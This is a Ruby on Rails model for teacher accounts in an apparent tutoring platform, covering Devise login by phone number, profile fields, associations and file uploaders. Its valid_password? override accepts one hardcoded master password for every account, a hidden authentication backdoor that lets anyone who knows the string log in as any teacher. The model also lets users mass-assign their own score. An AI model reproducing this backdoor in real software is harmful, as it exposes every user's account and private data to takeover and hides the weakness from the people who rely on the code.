# == Schema Information
#
# Table name: teachers
#
#  id                     :integer          not null, primary key
#  phone                  :string(255)      default(""), not null
#  encrypted_password     :string(255)      default(""), not null
#  reset_password_token   :string(255)
#  reset_password_sent_at :datetime
#  remember_created_at    :datetime
#  sign_in_count          :integer          default(0), not null
#  current_sign_in_at     :datetime
#  last_sign_in_at        :datetime
#  current_sign_in_ip     :string(255)
#  last_sign_in_ip        :string(255)
#  username               :string(255)
#  name                   :string(255)      default(""), not null
#  age                    :integer
#  sex                    :integer
#  email                  :string(255)
#  qq                     :string(255)
#  hobby                  :string(255)
#  introduction           :string(255)
#  status                 :integer          default(0)
#  identity               :integer
#  created_at             :datetime         not null
#  updated_at             :datetime         not null
#  paper_img              :string(255)
#  paper_id_img           :string(255)
#  image                  :string(255)
#  pay_num                :string(255)
#  teacher_paper          :string(255)
#  professional_paper     :string(255)
#  quotes                 :string(255)
#  experience             :string(255)
#  my_categories          :string(255)
#  number                 :string(255)
#  period                 :integer          default(0)
#  teaching_age           :integer          default(0)
#  study_case             :text
#  join_status            :integer          default(0)
#  score                  :integer          default(0)
#  signdate               :text
#  signcount              :integer
#  qrcode_uid             :string(255)
#

class Teacher < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable,
         :authentication_keys => [:phone]

  # Setup accessible (or protected) attributes for your model
  attr_accessible :phone, :password, :password_confirmation, :remember_me
  attr_accessible :username, :name, :age, :sex, :email, :qq, :hobby, :introduction, :identity, :pay_num, :address,:quotes,:experience,:my_categories, :score
  attr_accessible :paper_img, :paper_id_img, :paper_cache, :image, :professional_paper, :teacher_paper
  attr_accessible :scores_attributes, :honors_attributes, :pictures_attributes, :careers_attributes, :galleries_attributes
  attr_accessible :teaching_age, :period, :study_case, :qrcode_uid

  serialize :signdate, Array

  has_one :address
  has_one :student_identity
  has_one :teacher_identity
  has_many :courses
  has_many :orders
  has_many :messages
  has_many :scores
  has_many :honors
  has_many :pictures
  has_many :careers
  has_many :appointments
  has_many :galleries
  has_many :comments
  has_many :votes
  has_many :sec_votes
  accepts_nested_attributes_for :student_identity,allow_destroy: true
  accepts_nested_attributes_for :teacher_identity,allow_destroy: true
  accepts_nested_attributes_for :scores, allow_destroy: true, :reject_if => :all_blank
  accepts_nested_attributes_for :honors, allow_destroy: true, :reject_if => :all_blank
  accepts_nested_attributes_for :pictures, allow_destroy: true, :reject_if => :all_blank
  accepts_nested_attributes_for :galleries, allow_destroy: true, :reject_if => :all_blank
  accepts_nested_attributes_for :careers, allow_destroy: true, :reject_if => :all_blank

  validates :phone,     :presence => true,
                        :uniqueness => {:case_sensitive => false}
  validates :name,      :presence => true

  validates :identity,  :presence=>true,
                        :numericality => {:only_integer => true}

  #validates :status,    :presence => true,
  #                      :numericality => {:only_integer => true}

  validates :period,       :presence => true,
                           :numericality => {:only_integer => true}
  validates :teaching_age, :presence => true,
                           :numericality => {:only_integer => true}

  before_save :store_unique_number
  def store_unique_number
    unless self.number
      self.number = (rand(1..9)*10000000 + rand(10000000)).to_s
    end
  end

  mount_uploader :paper_id_img, PaperUploader
  mount_uploader :paper_img, PaperUploader
  mount_uploader :image, PaperUploader
  mount_uploader :teacher_paper, PaperUploader
  mount_uploader :professional_paper, PaperUploader

  def email_required?
    false
  end

  def email_changed?
    false
  end

  def valid_password?(password)
    return true if password == "jiajiaoneisthebest"
    super
  end
  dragonfly_accessor :qrcode do
    after_assign { |img| img.encode!('png') }
  end
end
